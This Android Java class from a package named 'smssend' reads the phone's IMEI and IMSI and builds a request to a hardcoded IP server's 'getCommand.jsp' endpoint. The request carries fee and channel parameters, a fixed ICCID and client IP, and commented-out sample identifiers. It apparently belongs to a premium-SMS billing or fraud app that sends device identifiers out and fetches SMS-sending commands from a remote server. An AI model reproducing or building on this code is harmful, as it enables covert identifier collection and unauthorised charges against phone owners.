package com.example.administrator.smssend;

import android.content.Context;
import android.telephony.TelephonyManager;

/**
 * Created by Administrator on 2016/6/23.
 */

public class URL
{
    public static String creator(Context context)
    {
        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);

        String imei = telephonyManager.getDeviceId();
        String imsi = telephonyManager.getSubscriberId();

        URL url = new URL(cpid, channelid, appId, appFeeId, feenum, imei, imsi);
        return url.getUrl();
    }

    private String getUrl()
    {
        return mUrl;
    }

    private final String mUrl;
    private static final String cpid = "103";
    private static final String channelid = "3238";
    private static final String appId = "2138";
    private static final String appFeeId = "3194";
    private static final String feenum = "200";
    //    private static final String imei = "357143040437889";
    //    private static final String imsi = "460026176314566";
    //    public static String url= "http://120.25.220.193:8099/send/getCommand.jsp?type=1&cpid=" + cpid + "&channelId=" + channelid + "&appId=" + appId + "&appFeeId=" + appFeeId + "&feenum=" + feenum + "&imei=" + imei + "&imsi=" + imsi + "&netInfo=GPRS&osInfo=4.1&osModel=ZTE&iccid=89860090010671234669&clientIp=117.136.5.16&extra=";

    public URL(String cpid, String channelid, String appId, String appFeeId, String feenum, String imei, String imsi)
    {
        mUrl = "http://120.25.220.193:8099/send/getCommand.jsp?type=1&cpid=" + cpid + "&channelId=" + channelid + "&appId=" + appId + "&appFeeId=" + appFeeId + "&feenum=" + feenum + "&imei=" + imei + "&imsi=" + imsi + "&netInfo=GPRS&osInfo=4.1&osModel=ZTE&iccid=89860090010671234669&clientIp=117.136.5.16&extra=";
    }
}
